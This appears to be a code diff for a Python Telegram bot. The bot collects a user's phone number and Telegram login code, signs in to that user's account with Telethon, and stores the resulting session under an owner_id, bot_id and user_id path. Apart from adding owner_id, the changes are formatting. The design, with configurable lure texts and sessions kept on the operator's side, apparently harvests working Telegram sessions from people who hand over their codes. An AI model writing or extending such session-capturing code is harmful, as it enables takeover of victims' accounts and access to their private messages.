@@ -8,7 +8,7 @@ from .session_service import get_session_path
 from .config import API_ID, API_HASH
 
 
-def create_router(texts, bot_id):
+def create_router(texts, bot_id, owner_id):
     router = Router()
     user_states = {}
 
@@ -18,7 +18,7 @@ def create_router(texts, bot_id):
     async def start_handler(message: Message):
         kb = ReplyKeyboardMarkup(
             keyboard=[[KeyboardButton(text="📱 Telefon", request_contact=True)]],
-            resize_keyboard=True
+            resize_keyboard=True,
         )
         user_states[message.from_user.id] = {"state": "phone"}
         await message.answer(texts.get("start", "Start"), reply_markup=kb)
@@ -39,7 +39,9 @@ def create_router(texts, bot_id):
             phone = message.text.strip()
 
             if not phone_regex.match(phone):
-                await message.answer("Telefonni to‘g‘ri formatda yuboring: +998901234567")
+                await message.answer(
+                    "Telefonni to‘g‘ri formatda yuboring: +998901234567"
+                )
                 return
 
             await process_phone(message, phone)
@@ -53,7 +55,7 @@ def create_router(texts, bot_id):
     async def process_phone(message: Message, phone: str):
         user_id = message.from_user.id
 
-        session_path = get_session_path(bot_id, user_id)
+        session_path = get_session_path(owner_id,bot_id, user_id)
         client = TelegramClient(session_path, API_ID, API_HASH)
 
         await client.connect()
@@ -69,7 +71,7 @@ def create_router(texts, bot_id):
         user_states[user_id] = {
             "state": "code",
             "phone": phone,
-            "code_hash": result.phone_code_hash
+            "code_hash": result.phone_code_hash,
         }
 
         await message.answer(texts.get("code_request", "Kod kiriting"))
@@ -84,17 +86,13 @@ def create_router(texts, bot_id):
         code = message.text.strip()
         code_hash = state["code_hash"]
 
-        session_path = get_session_path(bot_id, user_id)
+        session_path = get_session_path(owner_id, bot_id, user_id)
         client = TelegramClient(session_path, API_ID, API_HASH)
 
         await client.connect()
 
         try:
-            await client.sign_in(
-                phone=phone,
-                code=code,
-                phone_code_hash=code_hash
-            )
+            await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
             await client.disconnect()
             user_states.pop(user_id, None)
             await message.answer(texts.get("success", "Success"))
